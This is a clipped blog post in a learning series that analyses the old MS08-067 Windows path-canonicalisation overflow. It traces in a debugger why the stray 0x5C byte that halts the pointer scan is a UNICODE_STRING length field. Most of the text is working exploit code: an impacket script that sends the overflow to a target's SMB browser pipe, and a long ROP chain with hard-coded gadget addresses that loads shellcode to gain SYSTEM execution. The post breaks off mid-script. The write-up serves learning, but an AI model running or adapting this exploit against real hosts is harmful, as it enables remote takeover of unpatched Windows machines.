---
title: "[Learning] MS08-067 Part 2: Understanding How It Works in Depth | ISSAC/iss4cf0ng's blog"
source: https://iss4cf0ng.github.io/2026/10/13/2026-10-13-MS08067/
source_host: iss4cf0ng.github.io
clip_date: 2026-10-14T01:51:07+08:00
trace_id: d1924a50-c7d4-4962-846d-b7973abf3902
content_hash: f3ce232dc43ca385aff1e850188e8648d33fbcd28ba75346c2b44b1375b2bf75
status: synced
tags:
  - 漏洞分析
  - Windows逆向
series: null
feed_source: iss4cf0ng·漏洞利用学习
ai_summary: MS08-067 的 `\..\..\` 路径回溯令指针越界，`wcscpy` 覆盖 EIP；而停在 `0x.....444` 的 `0x5C` 并非真实反斜杠，而是 `UNICODE_STRING.Length` 的低字节，据此才能完成 ROP + shellcode 的完整利用。
ai_summary_style: key-points
images_status:
  total: 46
  succeeded: 4
  failed_urls:
    - /images/2026-10-13-MS08067/1.png
    - /images/2026-10-13-MS08067/3.png
    - /images/2026-10-13-MS08067/4.png
    - /images/2026-10-13-MS08067/5.png
    - /images/2026-10-13-MS08067/6.png
    - /images/2026-10-13-MS08067/7.png
    - /images/2026-10-13-MS08067/8.png
    - /images/2026-10-13-MS08067/9.png
    - /images/2026-10-13-MS08067/10.png
    - /images/2026-10-13-MS08067/11.png
    - /images/2026-10-13-MS08067/12.png
    - /images/2026-10-13-MS08067/13.png
    - /images/2026-10-13-MS08067/14.png
    - /images/2026-10-13-MS08067/15.png
    - /images/2026-10-13-MS08067/16.png
    - /images/2026-10-13-MS08067/17.png
    - /images/2026-10-13-MS08067/18.png
    - /images/2026-10-13-MS08067/19.png
    - /images/2026-10-13-MS08067/20.png
    - /images/2026-10-13-MS08067/21.png
    - /images/2026-10-13-MS08067/22.png
    - /images/2026-10-13-MS08067/1.png
    - /images/2026-10-13-MS08067/3.png
    - /images/2026-10-13-MS08067/4.png
    - /images/2026-10-13-MS08067/5.png
    - /images/2026-10-13-MS08067/6.png
    - /images/2026-10-13-MS08067/7.png
    - /images/2026-10-13-MS08067/8.png
    - /images/2026-10-13-MS08067/9.png
    - /images/2026-10-13-MS08067/10.png
    - /images/2026-10-13-MS08067/11.png
    - /images/2026-10-13-MS08067/12.png
    - /images/2026-10-13-MS08067/13.png
    - /images/2026-10-13-MS08067/14.png
    - /images/2026-10-13-MS08067/15.png
    - /images/2026-10-13-MS08067/16.png
    - /images/2026-10-13-MS08067/17.png
    - /images/2026-10-13-MS08067/18.png
    - /images/2026-10-13-MS08067/19.png
    - /images/2026-10-13-MS08067/20.png
    - /images/2026-10-13-MS08067/21.png
    - /images/2026-10-13-MS08067/22.png
notion_page_id: 3f875244-d011-815a-8de6-ca28294c367d
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> MS08-067 的 `\..\..\` 路径回溯令指针越界，`wcscpy` 覆盖 EIP；而停在 `0x.....444` 的 `0x5C` 并非真实反斜杠，而是 `UNICODE_STRING.Length` 的低字节，据此才能完成 ROP + shellcode 的完整利用。
> 
> - **溢出根因：** `NetpwPathCanonicalize` 子函数（`FUN_5b86a3ce`）对多个 `..\..\` 反复执行 `pwVar3 = pwVar3 - 1`，指针逃出缓冲区；回溯只在遇到 `\` 或 `param_1` 边界时停止。
> - **关键 `0x5C` 来源：** `FUN_5b86a0da` 调用 `ntdll.RtlIsDosDeviceName_U`，进而经 `ntdll.7C9139ED` 调 `RtlInitUnicodeString`，把长度字段写入该地址；`Directory2` 字节长 `78+14=92=0x5C`，故内存出现 `005E005C`。
> - **利用限制：** 路径不得超过 `0x208` 字节（Unicode 下 `len(path) ≤ 1040`），`Directory2` 必须恰为 92 字节，故 shellcode 放 `Directory1`，用 ROP gadget 从 `Directory2` 跳过去。
> - **绕坏字符技巧：** 参数含多个 `\x00` 时，先 `POP EAX` 装入 `~0x172 & 0xFFFFFFFF`，再用 `NOT EAX # POP EBP # RETN 0x0C` 还原为 `0x172`。
> - **成果：** ROP 链（含 `WriteProcessMemory`/`not` 组合）成功以 SYSTEM 权限在 Session 0 弹出 `calc`；不考虑 DEP 时可直接用 `shell_bind_tcp`（4444）拿互动 shell。

## Introduction

This article is part of my series: **[From Bug To Exploit](https://iss4cf0ng.github.io/FromBugToExploit)**.

In [this article](https://iss4cf0ng.github.io/2026/09/17/2026-9-17-MS08-67/), I explained how MS08-067 works. However, I only demonstrated how to overwrite `EIP` with `0xDEADBEEF`. I didn’t show how to execute arbitrary shellcode.

In addition, I think there are some details that I didn’t cover in the previous article.

Therefore, I decided to write this article to document the remaining details of this vulnerability.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/23c0c19572c15f21.png)

Bad mood recently... Sorry.

## How Does a Buffer Overflow Occur?

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/1.png)

In [the previous article](https://iss4cf0ng.github.io/2026/09/17/2026-9-17-MS08-67/), I mentioned that the vulnerability occurs because a sub-function of `NetpwPathCanonicalize` fails to properly check the boundaries of the input path:

```cpp
pwVar3 = _Dest;
if ((wVar1 != L'.') || ((local_8 != pwVar2 + -1 && (pwVar2 != param_1))))
    goto LAB_5b86a411;

_Source = pwVar2 + 1;
wVar1 = *_Source;
if (wVar1 == L'.') {
    wVar1 = pwVar2[2];
    if ((wVar1 == L'\\') || (wVar1 == L'\0')) {
        if (_Dest == (wchar_t *)0x0) {
            return 0;
        }
        wcscpy(_Dest, pwVar2 + 2);
        if (wVar1 == L'\0') {
            return 1;
        }
        do {
            pwVar3 = pwVar3 + -1;
            if (*pwVar3 == L'\\')
                break;
        } while (pwVar3 != param_1);
        pwVar2 = _Dest;
        pwVar3 = (wchar_t *)(~-(uint)(*pwVar3 != L'\\') & (uint)pwVar3);
        local_8 = _Dest;
    }
    goto LAB_5b86a411;
}
```

Ideally, this code should handle a single `.` or `..` path component. However, if the input contains multiple occurrences, such as `\..\..\`, the function performs the following operation without properly checking the pointer’s boundaries:

```cpp
pwVar3 = pwVar3 + -1;
```

As a result, the pointer may move outside the expected buffer boundaries. If this pointer is stored in a register such as `EAX`, its value may eventually point to a location outside the original buffer. The subsequent call to `wcscpy` can then copy the path to this location, potentially overwriting the return address and causing a buffer overflow.

That was how I described the vulnerability in the previous article. However, I didn’t explain when the iteration stops. Based on the implementation, the pointer used in the iteration (`pwVar3`) continues moving backward until it encounters a `\` character or reaches the boundary specified by `param_1`.

Therefore, I decided to investigate this behavior more deeply. Eventually, I figured out how it works.

To be honest, this is probably the most fascinating part of MS08-067.

We can use the PoC from the previous article:

```python
# exploit.py

import struct
import time
import sys

from impacket import smb
from impacket import uuid
from impacket.dcerpc.v5 import transport

shellcode =  b"\xcc" * 100

if len(shellcode) >= 410:
    print(f'Shellcode is too large: {len(shellcode)}')
    sys.exit(1)

num_nops = 410 - len(shellcode)
newshellcode = b"\x90" * num_nops
newshellcode += shellcode
shellcode = newshellcode

data_size = 78

def get_deadbeef() -> bytes:
    exploit = b'A' * 4 + struct.pack('<I', 0xDEADBEEF)
    exploit += (data_size - len(exploit)) * b'A'

    return exploit

def get_exploit() -> bytes:
    exploit = b''
    exploit += b'A' * 4
    exploit += struct.pack('<I', 0x771f1544) # jmp ebx
    exploit += (data_size - len(exploit)) * b'A'

    return exploit

def validate_args() -> bool:

    return True

def main():
    try:
        target = sys.argv[1]
        port = int(sys.argv[2])
    except IndexError:
        print('\nUsage: %s <target ip> <Port #>\n' % sys.argv[0])
        print('Example: python3 dos.py 192.168.1.1 445')
        sys.exit(-1)

    exploit = get_deadbeef()

    print(len(exploit))

    if port == 445:
        trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % target)
    else:
        trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % target, dstport=port, filename='\\browser')
    
    trans.connect()

    dce = trans.DCERPC_class(trans)
    dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
    
    path = (
        '\\'.encode('utf-16le') + 
        b"ABCDEFGHIJ" * 10 + 
        shellcode + 
        '\\..\\..\\'.encode('utf-16le') + 
        'ABCDEFG'.encode('utf-16le') + 
        exploit +
        b"\x00" * 2
    )
    
    server = b"\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
    prefix = b"\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
    
    MaxCount = b"\x36\x01\x00\x00"
    Offset = b"\x00\x00\x00\x00"
    ActualCount = b"\x36\x01\x00\x00"

    stub = server + MaxCount + Offset + ActualCount + path + b"\xE8\x03\x00\x00" + prefix + b"\x01\x10\x00\x00\x00\x00\x00\x00"

    print(len(path))
    print(MaxCount)

    dce.call(0x1f, stub)
    time.sleep(3)

if __name__ == '__main__':
    main()
```

Next, let’s trigger the crash and analyze it using Immunity Debugger.

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/3.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/3.png)

We can see that the destination address used by `wcscpy` is not very far from `EIP`. The destination is `0x011CF444`, which indicates where the pointer stopped during the backward scan.

How does this happen? Based on our previous analysis, the pointer should continue moving backward until it encounters a `\`. Therefore, it seems that a `\` exists at this address before the buffer overflow occurs.

Now, let’s investigate this behavior dynamically using Immunity Debugger.

According to the previous article, we know that the buffer overflow occurs in the function `FUN_5b86a3ce`.

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/4.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/4.png)

Therefore, we need to set a breakpoint at `0x5b86a3ce`.

After execution is interrupted at the breakpoint, we can see that there is a `\` at address `0x.....444`.

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/5.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/5.png)

So… does this mean that the character is always there?

Ghidra shows that the caller of `FUN_5b86a3ce` is `FUN_5b86a2e0`. We can set a breakpoint at `0x5b86a2e0` to investigate what happens before the vulnerable function is called.

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/6.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/6.png)

In Immunity Debugger, we can see that before `FUN_5b86a3ce` is called, the memory location `0x.....444` contains zeros. However, after another function, `0x5b86a0da`, executes, the same memory location contains the value `0x5C`.

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/8.png)

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/7.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/7.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/8.png)

At first glance, this might not seem particularly important, but it is actually essential to understanding the buffer overflow. This value determines where the backward scan stops. Without it, the pointer could continue moving far away from the original buffer and the location of `EIP`.

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/9.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/9.png)

Somewhere far from the original buffer

As a result, we would need to supply a much larger amount of junk data to overwrite `EIP`. However, the length of the input path is limited. Consequently, we might never be able to overwrite `EIP`, or we might only have enough space to execute a very small piece of shellcode.

By placing junk data at `0x.....444`, we can overwrite `EIP` with a relatively small amount of input.

Now, let’s investigate how the value `0x5C` is generated.

As mentioned earlier, this value appears after the execution of `0x5b86a0da`. Therefore, let’s step into this function using Immunity Debugger.

We can see that before `ntdll.RtlIsDosDeviceName_U` executes, the memory location `0x.....444` doesn’t contain `0x5C`. After the function executes, the location contains the value `0x5C`.

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/11.png)

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/10.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/10.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/11.png)

Let’s step into the API to investigate further.

Eventually, we can confirm that the API calls a sub-function at `ntdll.7C9139ED`, which then calls another API, `ntdll.RtlInitUnicodeString`. Inside the latter function, after a series of operations, the value `0x5C` is written to the memory location `0x.....444`.

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/13.png)

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/12.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/12.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/13.png)

Now, let’s analyze this behavior in Ghidra.

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/15.png)

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/14.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/14.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/15.png)

The decompiled code is quite complicated, so I’ll explain the relevant parts briefly.

According to the [Microsoft Learn documentation](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-rtlinitunicodestring), `RtlInitUnicodeString` is declared as follows:

```cpp
VOID RtlInitUnicodeString(
    [out]          PUNICODE_STRING DestinationString,
    [in, optional] PCWSTR          SourceString
);
```

This function initializes a Unicode string structure for use by other operations. Such initialization functions are commonly used when a program needs to prepare a string for subsequent processing. The caller provides a pointer to a `UNICODE_STRING` structure, and the function initializes its fields.

The structure [is defined](https://learn.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-unicode_string) as follows:

```cpp
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
```

In Ghidra, the variable is marked as `undefined4` and stored as a local variable.

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/16.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/16.png)

After calling `RtlInitUnicodeString`, the caller places data associated with this structure on the stack, at the location `0x.....444`.

This gives us an important clue: the value `0x5C` is related to the length field of the Unicode string structure. But what exactly does this length represent?

The answer is the second part of the payload path:

```
\Directory1\..\..\Directory2
```

The `Length` field of the `UNICODE_STRING` structure stores the length of the string in **bytes**, excluding the terminating null character. Since the string uses UTF-16 encoding, each ASCII character occupies two bytes.

In other words, if the byte length of `Directory2` is `0x5C` (`92` in decimal), the low byte of the `Length` field will be `0x5C` (the same numerical value as the ASCII backslash character).

This explains why we observe `0x5C` at that memory location. It is a byte from the length field, not necessarily an actual backslash character in the input string.

In my PoC, I constructed the payload path as follows:

```python
data_size = 78

def get_deadbeef() -> bytes:
    exploit = b'A' * 4 + struct.pack('<I', 0xDEADBEEF)
    exploit += (data_size - len(exploit)) * b'A'

    return exploit

path = (
    '\\'.encode('utf-16le') +
    b"ABCDEFGHIJ" * 10 +
    shellcode +
    '\\..\\..\\'.encode('utf-16le') +
    'ABCDEFG'.encode('utf-16le') +
    exploit +
    b"\x00" * 2
)
```

Therefore, the byte length of `Directory2` is `78 + 14 = 92` bytes, or `0x5C`. If we include the null byte, the total size becomes `94` bytes. This explains why we can see `005E005C` at `0x.....444`.

## Remote Code Execution

> Note: If you want to learn how to write this SMB exploit from scratch, please refer to [my previous article](https://iss4cf0ng.github.io/2026/09/17/2026-9-17-MS08-67/).

Lastly, I want to complete the exploitation script.

First, we have several limitations. The biggest one is the restricted buffer size. Ghidra showed that the path cannot exceed `0x208` bytes. Since we use Unicode, this means that the value returned by `len(path)` cannot exceed `1040`.

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/19.png)

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/18.png)

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/17.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/17.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/18.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/19.png)

Another problem is the ROP chain. We cannot have any bad characters in it. In other words, we most likely need to configure each parameter individually, which increases the size of the ROP chain.

Since the size of `Directory2` has to be `92` bytes, I chose to place the shellcode inside `Directory1`. However, since `EIP` is overwritten by `Directory2`, we need to find a way to redirect execution to `Directory1`. After the buffer overflow occurs, the stack layout looks like this:

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/20.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/20.png)

Therefore, I chose to insert some gadgets into `Directory2` to redirect execution to `Directory1`.

Another problem is that some parameters might contain multiple `\x00` bytes. While developing the ROP chain, I learned a new technique. If a parameter contains multiple bad characters (especially `\x00`) and we want to avoid constructing its value using multiple gadgets, we can use its bitwise `NOT` value instead. We can pop that value into `EAX` and then perform a `NOT` operation to recover the original value:

```python
rop5 += p32(0x77c21d16) # POP EAX # RETN    ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}
rop5 += p32(~0x172 & 0xFFFFFFFF)
rop5 += p32(0x7c961521) # NOT EAX # POP EBP # RETN 0x0C    ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}
rop5 += b'5555'
```

After these operations, `EAX` will contain `0x00000172`.

Therefore, the complete exploit script, including the ROP chain, can be implemented as follows:

```python
# exploit.py

import struct
import time
import sys
import argparse

from impacket import smb
from impacket import uuid
from impacket.dcerpc.v5 import transport

shellcode = b''
with open('calc.bin', 'rb') as f:
    shellcode = f.read()

data_size = 78

def p32(addr: int) -> bytes:
    return struct.pack('<I', addr)

def get_deadbeef() -> bytes:
    exploit = b'A' * 4 + struct.pack('<I', 0xDEADBEEF)
    exploit += (data_size - len(exploit)) * b'A'

    return exploit

def get_first_jump() -> bytes:
    rop1 = b''
    rop1 += p32(0x77c4dbde) # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'BBBB' # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'AA'
    rop1 += p32(0x77c52916) # ADD ESP,10 # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'AA'
    rop1 += b'AAAA'
    rop1 += b'DD'
    rop1 += p32(0xDEADBEEF)
    rop1 += b'DD'
    #rop1 += p32(0x77c4dbde) # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'EE'
    rop1 += p32(0x77c4e162) # ADD ESP,30 # POP EDX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'EE'
    rop1 += p32(0x77c4dbde) # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'AAAA'
    rop1 += b'AAAA'
    rop1 += p32(0x77c4dbde) # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'BBBB' # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += p32(0x77c4dbde) # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += p32(0x77c4dbde) # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}

    exploit = b''
    exploit += b'A' * 4
    exploit += rop1
    exploit += (data_size - len(exploit)) * b'A'

    return exploit

def get_exploit() -> bytes:
    exploit = b''
    exploit += b'A' * 4
    exploit += struct.pack('<I', 0x771f1544) # call edx
    exploit += (data_size - len(exploit)) * b'A'

    return exploit

def validate_args() -> bool:

    return True

def main():
    try:
        target = sys.argv[1]
        port = int(sys.argv[2])
    except IndexError:
        print('\nUsage: %s <target ip> <Port #>\n' % sys.argv[0])
        print('Example: python3 dos.py 192.168.1.1 445')
        sys.exit(-1)

    exploit = get_first_jump()

    add_esp_10 = p32(0x77c515cf) # ADD ESP,10 # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    add_esp_14 = p32(0x77c4d230) # ADD ESP,14 # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    add_esp_1c = p32(0x77c51bbb) # ADD ESP,1C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    add_esp_2c = p32(0x77c4d7e1) # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}

    rop1 = b''
    rop1 += p32(0x7c967cb8) # PUSH ESP # ADD BH,BH # DEC ECX # POP EAX # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'1111'
    rop1 += p32(0x7c9729a2) # ADD EAX,100 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'1111' # retn 0x04
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x77c1c9fd) # ADD EAX,-20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'1111'
    rop1 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'1111'
    rop1 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'1111'
    rop1 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'1111'
    rop1 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'1111'
    rop1 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'1111'
    rop1 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'1111'
    rop1 += p32(0x7c820969) # MOV EDI,EAX # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}

    rop2 = b''
    rop2 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += b'2222' # pop esi
    rop2 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += b'2222' # pop ebp
    rop2 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += b'2222' # pop ebp
    rop2 += p32(0x7c967e1b) # PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += b'2222' # pop ebp
    # retn 0x08 left

    # first argument
    rop3 = b''
    rop3 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'33333333' # retn 0x08
    rop3 += b'3333' # pop esi
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x7c91c91d) # XOR ECX,ECX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += p32(0x7c951376) # MOV DWORD PTR DS:[EAX],ECX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}

    rop4 = b''
    rop4 += p32(0x77c59f38) # XCHG EAX,ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop4 += p32(0x77c21d16) # POP EAX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop4 += p32(0xfffffe7f)
    rop4 += p32(0x7c961521) # NOT EAX # POP EBP # RETN 0x0C    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x77c59f38) # XCHG EAX,ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop4 += b'4' * 0x0c
    rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x7c951376) # MOV DWORD PTR DS:[EAX],ECX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}

    rop5 = b''
    rop5 += p32(0x77c59f38) # XCHG EAX,ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += p32(0x77c21d16) # POP EAX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += p32(~0x172 & 0xFFFFFFFF)
    rop5 += p32(0x7c961521) # NOT EAX # POP EBP # RETN 0x0C    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555'
    rop5 += p32(0x77c59f38) # XCHG EAX,ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5' * 0x0c
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555'
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555'
    rop5 += p32(0x77c59f38) # XCHG EAX,ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += p32(0x77c22d10) # ADD EAX,ECX # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555'
    rop5 += p32(0x77c59f38) # XCHG EAX,ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += p32(0x7c951376) # MOV DWORD PTR DS:[EAX],ECX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}

    rop6 = b''
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666'
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666'
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666'
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666'
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666'
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666'
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666'
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666'
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666'
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666'
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666'
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666'
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666'
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666'
    rop6 += p32(0x7c967e1b) # PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666'
    rop6 += b'6666'

    padding_A = b'AAAA'
    deadbeef = p32(0xDEADBEEF)

    addr_writeprocessmemory = p32(0x7c80220f)

    jmp_eax = p32(0x77f731de)

